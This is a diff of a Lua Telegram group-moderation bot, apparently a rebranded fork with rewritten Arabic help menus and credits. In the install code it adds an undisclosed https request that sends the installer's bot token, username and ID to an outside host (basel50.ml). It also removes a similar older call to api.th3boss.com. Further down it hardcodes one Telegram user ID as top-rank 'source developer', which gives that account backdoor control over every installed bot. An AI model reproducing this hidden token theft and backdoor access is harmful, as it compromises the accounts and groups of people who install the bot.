@@ -1,8 +1,5 @@
 
---[[
-BY @Q11111
-#---------------------------------------------------------------------
-]]
+
 
 Er_ssl   , https = pcall(require, "ssl.https")
 Er_http  , http  = pcall(require, "socket.http")
@@ -80,20 +77,23 @@ boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
 boss..":ApiSource","https://api.th3boss.com/",
-boss..":NameBot:","الزعيم",
-"TH3BOSS_INSTALL","Yes"
+boss..":NameBot:","اباظة",
+"TH3boss_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 info = {} 
-info.username = '@'..GetUser.result.username
-info.userbot  = BOT_User
-info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://api.th3boss.com/request/?insert='..JSON.encode(info))
+info.namebot = BOT_NAME
+info.userbot = BOT_User
+info.id = SUDO_USER
+info.token = Token
+info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+local Text = "¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n¦ شكرا لاستخدامك سورس اباظة \n¦ أرســل  الان /start\n¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n྿"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
@@ -114,16 +114,7 @@ print('\27[0;33m>>'..[[
 
 
 
-
-
-▀█████████▄   ▄██████▄     ▄████████    ▄████████
-███    ███ ███    ███   ███    ███   ███    ███
-███    ███ ███    ███   ███    █▀    ███    █▀
-▄███▄▄▄██▀  ███    ███   ███          ███
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @wViiVw
-███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
-███    ███ ███    ███    ▄█    ███    ▄█    ███
-▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ Source The3Boss
+DEV » @xb_0b
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -133,7 +124,7 @@ File = {}
 local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 boss = Token:match("(%d+)")
 our_id = tonumber(boss)
-ApiBoss = redis:get(boss..":ApiSource")
+Apiboss = redis:get(boss..":ApiSource")
 ApiToken = "https://api.telegram.org/bot"..Token
 Bot_User = redis:get(boss..":UserNameBot:")
 SUDO_ID = tonumber(redis:get(boss..":SUDO_ID:"))
@@ -161,15 +152,7 @@ print('\27[0;33m>>'..[[
 
 
 
-▀█████████▄   ▄██████▄     ▄████████    ▄████████ 
-███    ███ ███    ███   ███    ███   ███    ███ 
-███    ███ ███    ███   ███    █▀    ███    █▀  
-▄███▄▄▄██▀  ███    ███   ███          ███        
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @wViiVw
-███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
-███    ███ ███    ███    ▄█    ███    ▄█    ███ 
-▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ VERSION » v]]..version..[[
-
+DEV » @xb_0b
 -------------------------------------------------------------------
 
 ]]..'\027[0;32m'
@@ -178,7 +161,7 @@ print('\27[0;33m>>'..[[
 ..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
 ..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
 ..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
-..'¦ Api_Src->: \27[1;34m'..ApiBoss..'\027[0;32m\n'
+..'¦ Api_Src->: \27[1;34m'..Apiboss..'\027[0;32m\n'
 ..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
 ..'======================================\27[0;33m\27[0;31m'
 )
@@ -215,10 +198,10 @@ if res == 200 then
 print(url) 
 local Req = JSON.decode(url)
 if Req.ok and Req.result and Req.result.status == "left" or Req.result.status == "kicked" then
-return "🚸 | عـزيـزي آشـترگ بآلقنآ‌‏هہ آولآ ["..UserChaneel.."] \n🔛 | لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
+return " عـزيـزي آشـترگ بآلقنآ‌‏هہ آولآ ["..UserChaneel.."] \n لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
 end
 else
-return "🚸 | عـزيـزي آشـترگ بآلقنآ‌‏هہ آولآ ["..UserChaneel.."] \n🔛 | لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
+return " عـزيـزي آشـترگ بآلقنآ‌‏هہ آولآ ["..UserChaneel.."] \n لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
 end
 end
 return false
@@ -302,33 +285,33 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200  then 
+if msg.sender_user_id_ == 656329268   then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي 👨🏻‍✈️' 
+msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي ‍' 
 msg.Rank = 1
 elseif redis:sismember(boss..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'المطور'
-msg.TheRank = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'مطور البوت 👨🏽‍💻'
+msg.TheRank = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'مطور البوت '
 msg.Rank = 2
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
-msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي 👲🏼'
+msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي '
 msg.Rank = 11
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المنشىء'
-msg.TheRank = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المنشىء 👷🏽'
+msg.TheRank = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المنشىء '
 msg.Rank = 3
 elseif msg.GroupActive and redis:sismember(boss..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
-msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'مدير البوت 👨🏼‍⚕️' 
+msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'مدير البوت ' 
 msg.Rank = 4
 elseif msg.GroupActive and redis:sismember(boss..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
-msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'ادمن في البوت 👨🏼‍🎓'
+msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'ادمن في البوت '
 msg.Rank = 5
 elseif msg.GroupActive and redis:sismember(boss..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRank = redis:get(boss..":RtbaNew7:"..msg.chat_id_) or 'عضو مميز'
@@ -336,7 +319,7 @@ msg.Rank = 6
 elseif msg.sender_user_id_ == our_id then
 msg.Rank = 7
 else
-msg.TheRank = 'فقط عضو 🙍🏼‍♂️'
+msg.TheRank = 'فقط عضو '
 msg.Rank = 10 
 end
 
@@ -385,11 +368,11 @@ kick_user(msg.sender_user_id_, msg.chat_id_)
 end
 if msg.content_.members_[0].id_ == our_id and redis:get(boss..':WELCOME_BOT') then
 SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-sendPhoto(msg.chat_id_,msg.id_,redis:get(boss..':WELCOME_BOT'),[[💯¦ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(boss..':NameBot:')..[[ 🎖
-💰¦ آختصـآصـي حمـآيهہ‏‏ آلمـجمـوعآت
-📛¦ مـن آلسـبآم وآلتوجيهہ‏‏ وآلتگرآر وآلخ...
-⚖️¦ مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ 🌿
-👨🏽‍🔧]])
+sendPhoto(msg.chat_id_,msg.id_,redis:get(boss..':WELCOME_BOT'),[[¦ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(boss..':NameBot:')..[[ 
+¦ آختصـآصـي حمـآيهہ‏‏ آلمـجمـوعآت
+¦ مـن آلسـبآم وآلتوجيهہ‏‏ وآلتگرآر وآلخ...
+¦ مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ 
+]])
 return false
 end
 if not ISONEBOT then
@@ -419,8 +402,8 @@ Del_msg(msg.chat_id_,msg.id_)
 return false 
 else
 if redis:get(boss.."lock_check"..msg.chat_id_) and not redis:get(boss..":TqeedUser:"..msg.chat_id_..Senderid) then
-local text = "⚜️┇ اهلاً بك في المجموعة\n🛠┇ للتأكد بأنك لست { ربوت }\n⚠️┇ تم تقييدك اضغط الزر بالاسفل\n💡┇ للتأكد انك { عضو حقيقي }🌻👇🏾"
-local inline = {{{text="• أضـغط ۿـنا للتـأكد أنك لست ربوت ♻️",callback_data="CheckRobotJoin:"..Senderid}}}
+local text = " اهلاً بك في المجموعة\n للتأكد بأنك لست { ربوت }\n تم تقييدك اضغط الزر بالاسفل\n للتأكد انك { عضو حقيقي }"
+local inline = {{{text="• أضـغط ۿـنا للتـأكد أنك لست ربوت ",callback_data="CheckRobotJoin:"..Senderid}}}
 Restrict(msg.chat_id_,Senderid,1)
 return send_inline(msg.chat_id_,text,inline,msg.id_)
 end
@@ -483,15 +466,15 @@ return false
 end 
 end 
 
-if ScriptFile and ScriptFile.Boss then 
-if msg.text and ScriptFile.iBoss then
-XBoss = ScriptFile.Boss
+if ScriptFile and ScriptFile.boss then 
+if msg.text and ScriptFile.iboss then
+Xboss = ScriptFile.boss
 local list = redis:hgetall(boss..":AwamerBotArray:"..msg.chat_id_)
-for Boss2,k in pairs(list) do
+for boss2,k in pairs(list) do
 Text = msg.text
 Text2 = k
-if Text:match(Boss2) then 
-local amrr = {Text:match(Boss2)}
+if Text:match(boss2) then 
+local amrr = {Text:match(boss2)}
 local AmrOld = redis:hgetall(boss..":AwamerBotArray2:"..msg.chat_id_)
 amrnew = "" amrold = ""
 for Amor,ik in pairs(AmrOld) do
@@ -501,9 +484,9 @@ amrnew = Amor ; amrold = ik
 end end end
 Text = Text:gsub(amrnew,amrold)
 AF = CheckBotA(msg) if AF then 
-local AFinline = {{{text="📡 | آشـترگ بآلقنآ‌‏هہ",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+local AFinline = {{{text=" | آشـترگ بآلقنآ‌‏هہ",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
 return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
-GetMsg = ScriptFile.iBoss(msg,{Text:match(Text2)})
+GetMsg = ScriptFile.iboss(msg,{Text:match(Text2)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
@@ -511,56 +494,56 @@ return false
 end 
 end
 end
-for k, Boss in pairs(XBoss) do
+for k, boss in pairs(Xboss) do
 Text = msg.text
 Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
-if Text:match(Boss) then -- Check Commands To admin
+if Text:match(boss) then -- Check Commands To admin
 AF = CheckBotA(msg) if AF then 
-local AFinline = {{{text="📡 | آشـترگ بآلقنآ‌‏هہ",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+local AFinline = {{{text=" | آشـترگ بآلقنآ‌‏هہ",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
 return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
-GetMsg = ScriptFile.iBoss(msg,{Text:match(Boss)})
+GetMsg = ScriptFile.iboss(msg,{Text:match(boss)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
+print("\27[1;35m¦This_Msg : ",boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 return false
 end 
 end
 end
-end  --- End iBoss
-if ScriptFile.dBoss then
-if ScriptFile.dBoss(msg) == false then
+end  --- End iboss
+if ScriptFile.dboss then
+if ScriptFile.dboss(msg) == false then
 return false
 end
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
 
 for name,Plug in pairs(File) do
-if Plug.Boss then 
-if msg.text and Plug.iBoss then
-for k, Boss in pairs(Plug.Boss) do
-if msg.text:match(Boss) then
-local GetMsg = Plug.iBoss(msg,{msg.text:match(Boss)})
+if Plug.boss then 
+if msg.text and Plug.iboss then
+for k, boss in pairs(Plug.boss) do
+if msg.text:match(boss) then
+local GetMsg = Plug.iboss(msg,{msg.text:match(boss)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32m"..name.."\27[0m")
+print("\27[1;35m¦This_Msg : ",boss.." | Plugin is: \27[1;32m"..name.."\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 end 
 return false
 end
 end
 end
-if Plug.dBoss then
-Plug.dBoss(msg)
+if Plug.dboss then
+Plug.dboss(msg)
 print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
 end
 else
-print("The File "..name.." Not Runing in The Source Boss")
+print("The File "..name.." Not Runing in The Source boss")
 end 
 
 end
 else
-print("The File Script.lua Not Runing in The Source Boss")
+print("The File Script.lua Not Runing in The Source boss")
 end
 end
 
@@ -598,8 +581,8 @@ Adminn = true
 end	
 if Adminn then
 Restrict(ChatID,UserJoin,2)
-answerCallbackQuery(data.id_,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️",true)
-EditMsg(ChatID,dataid,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️")
+answerCallbackQuery(data.id_,"|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️",true)
+EditMsg(ChatID,dataid,"|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️")
 else
 answerCallbackQuery(data.id_,"عذرا انت لست الشخص المقيد او لا يوجد لديك صلاحيه الادارة , نعتذر منك",true)	
 end
@@ -610,39 +593,57 @@ end
 	  if datab and datab:match('/help1@(.*)') then
 	  local users = datab:match('/help1@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
-	  local Teext = [[ 
-	┄─┅══┅─┄     
-¹↫❬آوآمر الرفع والتنزيل❭
-┄─┅═ـ═┅─┄
-👨‍🔧│رفع «» تنزيل ❬منشئ اساسي❭ 
-👨‍🔧│رفع «» تنزيل ❬منشئ❭ 
-👷‍♂╿رفع «» تنزيل ❬المدير❭
-👨‍🔧│رفع «» تنزيل ❬ادمن❭ 
-👨‍💼│رفع «» تنزيل ❬مميز❭ 
-┄─┅═ـ═┅─┄
-²↫ ❬آو꯭آم꯭ـر آ꯭لم꯭ـس꯭ـح꯭ للم꯭ـنش꯭ـئ❭
-┄─┅═ـ═┅─┄
-🗑│مسح الادمنـيـه «» ❬لمسح الادمنيه❭
-🗑│مسح المميزين «» ❬لمسح المميزين❭
-🗑│مسح المــــدراء «» ❬لمسح المدراء❭
-┄─┅═ـ═┅─┄
-³↫ ❬آوآمـر آلحظـر وآلطــرد وآلتقييد❭
-┄─┅═ـ═┅─┄
-🤦‍♂│حظر ❬بالرد «» بالمعرف❭ لحظر العضو
-🙆‍♂│الغاء الحظر ❬بالرد «» بالمعرف❭ لالغاء الحظر 
-🏌‍♂│طرد ❬بالرد «» بالمعرف❭ لطرد العضو
-🔇│كتم ❬بالرد «» بالمعرف❭ لكتم العضو 
-🔊│الغاء الكتم ❬بالرد«»بالمعرف❭لالغاء الكتم 
-🚷│تقييد ❬بالرد «» بالمعرف❭ لتقييد العضو
-🔓│فك التقييد ❬بالرد «» بالمعرف❭ لالغاء تقييد العضو
-🚫│منع + الكلمه «» لمنع كلمه داخل المجموعه
-⭕️╽الغاء منع «» لالغاء منع الكلمه
-┄─┅═ـ═┅─┄
-	  ]]
+	  local Teext =  [[ اهلا بك في قائمة اوامر الاداريين
+
+﹎﹎﹎﹎﹎اوامر الرفع والتنزيل﹎﹎﹎﹎﹎
+• رفع - تنزيل منشى اساسي
+• رفع - تنزيل مشرف
+• رفع - تنزيل منشى
+• رفع - تنزيل مدير
+• رفع - تنزيل ادمن
+• رفع - تنزيل مميز
+• تنزيل الكل - لأزاله جميع الرتب أعلاه
+
+﹎﹎﹎﹎﹎اوامر المسح﹎﹎﹎﹎﹎
+• مسح المنشئين الاساسيين
+• مسح المنشئين
+• مسح المدراء
+• مسح الادمنيه
+• مسح المميزين
+• مسح المحظورين
+• مسح المكتومين
+• مسح قائمه العام
+• مسح قائمه المنع
+• مسح الردود العامه
+• مسح الردود
+• مسح الاوامر
+• مسح + عدد
+• مسح بالرد
+• مسح ايدي عام
+• مسح كليشه الايدي
+• مسح كليشه الستارت
+• مسح الترحيب
+• مسح الرابط
+• مسح كلايش التعليمات
+
+﹎﹎﹎﹎﹎اوامر الطرد الحظر الكتم﹎﹎﹎﹎﹎
+• حظر - بالرد،بالمعرف،بالايدي
+• طرد - بالرد،بالمعرف،بالايدي 
+• كتم - بالرد،بالمعرف،بالايدي
+• تقيد - بالرد،بالمعرف،بالايدي
+• الغاء الحظر - بالرد،بالمعرف،بالايدي
+• الغاء الكتم - بالرد،بالمعرف،بالايدي
+• فك التقييد - بالرد،بالمعرف،بالايدي
+• رفع القيود - لحذف ↜ كتم،حظر،حظر عام،تقييد
+• منع + الكلمه
+• الغاء منع + الكلمه
+• طرد البوتات
+• طرد المحذوفين
+• كشف البوتات]]
 	  
 	  keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '🔙 ...', callback_data="/help@"..data.sender_user_id_}},
+{{text = '⏪', callback_data="/help@"..data.sender_user_id_}},
 
 }
 	  return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -653,28 +654,35 @@ keyboard.inline_keyboard = {
 	  local users = datab:match('/help2@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
 	  local Teext = [[
-	┄─┅══┅─┄
-	👨‍💻↫❬اوامر رؤية الاعدادات❭
-	┄─┅═ـ═┅─┄
-	🔮╿الـرابـط «» لعرض ❬الرابط❭  
-	🔗│انشاء رابط «» لستخراج ❬الرابط❭  
-	👨‍🔧│الادمنيه «» لعرض ❬الادمنيه❭
-	🧾│القوانين «» لعرض ❬القوانين❭ 
-	🌄│الوسائط «» لعرض اعدادات ❬الميديا❭ 
-	👨‍💻│الحمايـه «» لعرض كل ❬الاعدادات❭  
-	👷‍♂│المــدراء «» لعرض ❬الاداريين❭ 
-	🤐│المكتومين «» لعـرض ❬المكتومين❭ 
-	🥺│المحظورين «» لعرض ❬المحظورين❭
-	🛠│الاعدادات «» لعرض اعدادات❬المجموعه❭ 
-	👥│المجموعه «» لعرض معلومات❬المجموعه❭
-	👨‍💻│تغير امر. + الامر «» لتغير❬اوامر البوت❭
-	⌨│مسح امر + الامر «» لمسح❬الامر المضاف❭
-	💻╽قائمـه الاوامر «» لمعرفه❬الاوامرالمضافه❭
-	┄─┅═ـ═┅─┄
-	  ]]
+	﹎﹎﹎﹎اوامر الوضع ﹎﹎﹎﹎
+• ضع الترحيب
+• ضع القوانين
+• ضع وصف
+• ضـع رابط
+• اضف امر
+• اضف رد عام
+• تعيين ايدي عام
+• تعيين كليشه الايدي
+
+﹎﹎﹎﹎اوامر رؤية الاعدادات﹎﹎﹎﹎
+• المطورين
+• المنشئين الاساسيين
+• المنشئين 
+• الادمنيه
+• المدراء
+• المميزين
+• المحظورين
+• القوانين
+• المكتومين
+• المطور 
+• معلوماتي 
+• الحمايه  
+• الوسائط
+• الاعدادت
+• المجموعه ]]
 	keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '🔙 ...', callback_data="/help@"..data.sender_user_id_}},
+{{text = '⏪', callback_data="/help@"..data.sender_user_id_}},
 
 }
 	  return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -685,46 +693,62 @@ keyboard.inline_keyboard = {
 	  local users = datab:match('/help3@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
 	  local Teext = [[ 
-	┄─┅══┅─┄
-¹↫❬اوامر حمايـه المجموعه❭
-┄─┅═ـ═┅─┄     
-📵╿قفل «» فتح ❬الكـــل❭
-🙋‍♂│قفل «» فتح ❬التـاك❭
-📽│قفل «» فتح ❬الفيـديـــو❭
-🌄│قفل «» فتح ❬الصــــــــور❭
-🚫│قفل «» فتح ❬الملصقات❭
-🎭│قفل «» فتح ❬المتحركه❭
-🔇│قفل «» فتح ❬البصمــات❭
-🤐│قفل «» فتح ❬الدردشـــه❭
-🖇│قفل «» فتح ❬الــروابـــط❭
-🤖│قفل «» فتح ❬البـــوتــات❭
-🖊│قفل «» فتح ❬التعــديــل❭
-🎫│قفل «» فتح ❬المعرفــات❭
-🎫│قفل «» فتح ❬المعرفــات❭
-🎫│قفل «» فتح ❬الـــفارسيه❭
-🎫│قفل «» فتح ❬الفــشـــــار❭
-🎫│قفل «» فتح ❬تعديل الميديا❭
-📝│قفل «» فتح ❬الكـــلايـش❭
-♻️│قفل «» فتح ❬التـــكـــــرار❭
-📞│قفل «» فتح ❬الجــهـــــات❭
-🌐│قفل «» فتح ❬الانـــلايــن❭
-🔚│قفل «» فتح ❬التوجيــــه❭
-🚫│قفل «» فتح ❬الدخول بالرابط❭
-🏌‍♂╽قفل «» فتح ❬البوتات بالطرد❭
-┄─┅═ـ═┅─┄     
-²↫❬القفل بالتقييـد❭
-┄─┅═ـ═┅─┄                                                                                        
-📸╿قفل «» فتح ❬الــصــــــور بالتقييـد❭
-🔗│قفل «» فتح ❬الــروابــط بالتقييـد❭
-🎭│قفل «» فتح ❬المتحركه بالتقييـد❭
-📽│قفل «» فتح ❬الفيـــديــو بالتقييد❭
-🔒╽قفل «» فتح ❬التوجيــه بالتقييــد❭ 
-┄─┅═ـ═┅─┄
+	﹎﹎﹎ اوامر القفل والفتح بالمسح ﹎﹎﹎
+• قفل - فتح التعديل  
+•️ قفل - فتح البصمات 
+• قفل - فتح الفيديو 
+• قفل - فتح الـصــور 
+• قفل - فتح الملصقات 
+• قفل - فتح المتحركه 
 
-	  ]]
+• قفل - فتح الدردشه 
+• قفل - فتح الروابط 
+• قفل - فتح التاك 
+• قفل - فتح البوتات 
+• ️قفل - فتح المعرفات 
+• قفل - فتح البوتات بالطرد 
+
+• قفل - فتح الكلايش 
+•️ قفل - فتح التكرار 
+• قفل - فتح التوجيه 
+• قفل - فتح الانلاين 
+• قفل - فتح الجهات 
+• قفل - فتح الــكـــل 
+
+• قفل - فتح الفشار
+• قفل - فتح الفارسيه
+• قفل - فتح الانكليزيه
+• قفل - فتح الاضافه
+• قفل - فتح الصوت
+• قفل - فتح الالعاب
+• قفل - فتح الماركدوان
+• قفل - فتح الويب
+
+﹎﹎﹎﹎اوامر الفتح والقفل بالتقييد﹎﹎﹎
+• قفل - فتح التوجيه بالتقييد 
+• قفل - فتح الروابط بالتقييد 
+• قفل - فتح المتحركه بالتقييد 
+• قفل - فتح الصور بالتقييد 
+• قفل - فتح الفيديو بالتقييد 
+
+﹎﹎﹎﹎اوامر التفعيل والتعطيل ﹎﹎﹎﹎
+• تفعيل - تعطيل الترحيب 
+• تفعيل - تعطيل الردود 
+• تفعيل - تعطيل التحذير 
+• تفعيل - تعطيل الايدي
+• تفعيل - تعطيل الرابط
+• تفعيل - تعطيل المغادره
+• تفعيل - تعطيل الحظر
+• تفعيل - تعطيل الحمايه
+• تفعيل - تعطيل تاك للكل
+• تفعيل - تعطيل الايدي بالصوره
+• تفعيل - تعطيل التحقق 
+• تفعيل - تعطيل ردود السورس 
+• تفعيل - تعطيل التنظيف التلقائي 
+]]
 	  keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '🔙 ...', callback_data="/help@"..data.sender_user_id_}},
+{{text = '⏪', callback_data="/help@"..data.sender_user_id_}},
 
 }
 	  return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -735,35 +759,29 @@ keyboard.inline_keyboard = {
 	  local users = datab:match('/help4@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
 	  local Teext = [[ 
-	┄─┅══┅─┄
-	👨‍💻↫❬اوامر الخدمــه❭ 
-	┄─┅═ـ═┅─┄
-	🎟╿ايـــدي «» لعرض صورتك -:- معلوماتك
-	🎫│ايديـي «» لعرض ايديك 
-	💳│ايدي بالرد «» لعرض ايدي الشخص
-	🔗│الرابط «» لستخراج رابط المجموعه
-	📞│جهاتي «» لمعرفه عدد جهاتك
-	🕹│الالعاب «» لعرض العاب البوت
-	😍│بحث + اسم الاغنيه «» لبحث انواع الاغاني
-	🧮│نقاطي «» لمعرفه عدد نقاطك
-	🧮│بيع نقاطي + العدد «» لبيع نقاطك لتحصل على رسائل
-	💳│معلوماتي «» لعرض معلوماتك
-	📟│السورس «» لعرض سورس البوت
-	🎖│الرتبه بالرد «» لمعرفه رتبه الشخص
-	📊│التفاعل -:- بالمعرف «» لمعرفه تفاعل الشخص
-	📈│التفاعل بالــرد «» لمعرفه تفاعل الشخص
-	💢│كشف بالمعرف «» لمعرفه معلومات حسابه
-	👁‍🗨│كشف بالرد «» لمعرفه معلومات حسابه
-	🤖│كشف البوتات «» لاظهار عدد البوتات الموجوده بالمجموعه
-	🏌‍♂│طرد البوتات «» لطرد كل البوتات
-	🏌‍♀│طرد المحذوفين «» لطرد الحسابات المحذوفه
-	🔗│رابط الحذف «» لحذف حساب تلكرام
-	🎨╽زخرفه «» لزخرفه اي شي تريد
-	┄─┅═ـ═┅─┄
-	  ]]
+	﹎﹎﹎ اوامر التسليه ﹎﹎﹎
+• رفع-تنزيل ← قرد
+•️ رفع-تنزيل ← قلبي
+• رفع-تنزيل ← وتكه
+• رفع-تنزيل ← زوجتي
+• رفع-تنزيل ← زوجي
+
+• مسح القرده
+• مسح قلوبي
+• مسح الوتك
+• مسح ازواجي
+• مسح زوجاتي
+
+• قائمه القرده
+• قائمه قلوبي
+•️ قائمه الوتك
+• قائمه ازواجي
+• قائمه زوجاتي
+
+]]
 	  keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '🔙 ...', callback_data="/help@"..data.sender_user_id_}},
+{{text = '⏪', callback_data="/help@"..data.sender_user_id_}},
 
 }
 	  return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -774,25 +792,32 @@ keyboard.inline_keyboard = {
 	  local users = datab:match('/help5@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
 	  local Teext = [[ 
-	┄─┅══┅─┄
-	🤪╿❬ آوآمر التحشيش❭
-	🙋🏽‍♂│مرحبآ عزيزي ،
-	💯╽إليـك اوامر التحشيش كـ التالي
-	┄─┅═ـ═┅─┄
-	🤴╿رفع «» تنزيل ❬ تـــاج ❭
-	👰│رفع «» تنزيل ❬ مرتي ❭
-	🤪│رفع «» تنزيل ❬ اثـول ❭
-	🐕│رفع «» تنزيل ❬ جلـب ❭
-	🦓│رفع «» تنزيل ❬ مطـي ❭
-	🐐│رفع «» تنزيل ❬ صخـل ❭
-	🦎│رفع «» تنزيل ❬ زاحف ❭
-	❤️│رفع «» ❬ بكلبي ❭ تنزيل «» ❬ من كلبي❭
